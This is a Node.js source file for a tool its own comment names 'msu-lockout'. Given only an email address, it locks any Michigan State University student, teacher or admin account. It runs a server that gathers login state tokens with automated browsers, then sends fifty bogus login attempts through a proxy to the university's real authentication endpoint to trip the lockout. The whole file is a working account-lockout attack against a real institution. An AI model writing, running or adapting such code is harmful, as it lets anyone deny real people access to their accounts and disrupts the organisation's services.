// main.js
/*
msu-lockout is used to disable any michigan state account (teacher, admin or student) 
given the account's email, NO password is required for this hack and lockout is around 20minutes - 1hour
The only way for a victim to recover the account is to call the MSU IT desk.
*/

//imports
const fetch = require("node-fetch")
const fastify = require('fastify')()
const browser = require("./browser.js")
const cors = require('@fastify/cors');
const HttpsProxyAgent = require('https-proxy-agent');

//register cors
fastify.register(cors, { });

// vars
var stateTokens = []
const requiredTokens = 5  // amount of state tokens we need to trigger detection and disable account
const proxyAgent = new HttpsProxyAgent('http://p.webshare.io:9999'); //proxy

//addToken - used to add token data to 'stateTokens' var
function addToken(data) {
  stateTokens.push(data)
}

//grab_tokens - used to grab tokens, or wait in queue and pool until ready
function getItems() {
  return new Promise( async(resolve,_) => {
    // run until state tokens array is greater then required tokens
    var grabbedTokens = false
    while (!grabbedTokens) {
      if (stateTokens.length < requiredTokens) { //not enough items, poll for 2 seconds
        await new Promise(r => setTimeout(r, 2000));
      } else { //enough items in array
        //grab first five elements and splice
        const items = stateTokens.slice(0, 5);
        stateTokens.splice(0, requiredTokens);
        grabbedTokens = true

        //return
        resolve(items)
      }
    }
  })
}

// attempt_login - used to return valid or invalid login state
async function attempt_login(account,stateToken) {
  return new Promise((resolve,reject) => {
    // create fetch request
    // create payload
    const payload = {
      "identifier": account,
      "credentials": {
          "passcode": "AJSSasGf!y_FjFay!f_1973"
      },
      "stateHandle": stateToken["stateToken"]
    }

    //send fetch request
    fetch("https://auth.msu.edu/idp/idx/identify", {
      "headers": {
        "accept": "application/json; okta-version=1.0.0",
        "accept-language": "en-US,en;q=0.5",
        "cache-control": "no-cache",
        "content-type": "application/json",
        "pragma": "no-cache",
        "sec-ch-ua": "\"Not_A Brand\";v=\"99\", \"Brave\";v=\"109\", \"Chromium\";v=\"109\"",
        "sec-ch-ua-mobile": "?0",
        "sec-ch-ua-platform": "\"macOS\"",
        "sec-fetch-dest": "empty",
        "sec-fetch-mode": "cors",
        "sec-fetch-site": "same-origin",
        "sec-gpc": "1",
        "x-okta-user-agent-extended": "okta-auth-js/6.9.0 okta-signin-widget-6.9.0",
        "Referer": "https://auth.msu.edu/app/msu_atd2l_1/exk8au7wid9bEq7Jw357/sso/saml?SAMLRequest=jdG7asMwFAbgvdB3MNqtm%2bXIFnYgtEsgXZI2Q5eiynJisCVXRyp9%2fDoNoR27nQs%2ffJzTbFI8u739SBZitn1sEehpDNf%2brSokL%2fuaUll1wphOl6yv%2b44yU64MFz3KjjbA4F2LOKYo2wIku3UQtYvLiPIipyzn1TNnSlSKFlhKyUpWvKJsA2BDXLIP3kGabDjY8DkY%2b7Lftegc4wyKkI6PeIKEbZcuNRlnohcwGf1pcORC3V0qvOxQ9jWNDlqUglNewwDK6cmCikYdNk87tQjVHHz0xo9ofX%2bXZc2PN%2fwnqG9atL7ZqJEllx3LacVFLpgQue5pnddlLwxnlq1oh6N1yy0Av4fhdI4wa2Ox8dMvvSFXxAJqyN9nrL8B",
        "Referrer-Policy": "strict-origin-when-cross-origin"
      },
      agent:proxyAgent,
      "body": JSON.stringify(payload),
      "method": "POST"
    }).then(res => res.json()) //convert to JSON
    .then((data) => {
      //return back 
      console.log(JSON.stringify(data))
      resolve(true)
    })
    .catch((err) => { //most likely network error
        console.log("Fetch error : " + err)
        resolve(false)
    })
  })
}

//run - main route, controls logic of attack
fastify.post('/sendAttack', async(request, reply) => {
  // parse bodys
  const body = request.body

  // check to make sure account isn't empty and email
  const emailRegex = /^[a-zA-Z0-9._-]+@msu.edu$/;
  if (emailRegex.test(body["account"])) {
    //send back results that account is waiting in queue
    reply.send({"status":"success"})

    //wait for proper state tokens
    const tokens = await getItems()

    //send attack using tokens
    for(var i=0;i<tokens.length;i++) {
      for(var x=0;x<10;x++) { //send 10 requests per state token (50 total)
        const login_attempt = await attempt_login(body["account"], tokens[i])
      
        //check results
        if (login_attempt !== false) {
          //sucess
          console.log("Successfully attempted attack")
        } else {
          console.log("Attempted attack unsuccesful")
        }
      }
    }
  } else {
    //403 unauthorized
    reply.status(403)
  }
})

//state token monitors
function state_token_monitor() {
  console.log("checking...")
  if (stateTokens.length < requiredTokens) {
    //spawn 3 browsers
    for (var i=0;i<5;i++) {
      browser.run(i, addToken)
    }
  }
}

//run every 30 seconds
setInterval(() => { state_token_monitor(); }, 30000) //check every 30 seconds

//run state token monitor at start
state_token_monitor();

//start fastify server
fastify.listen(3000, (err) => { //listen on port 80
  if (err) throw err
  console.log(`server listening on ${fastify.server.address().port}`)
})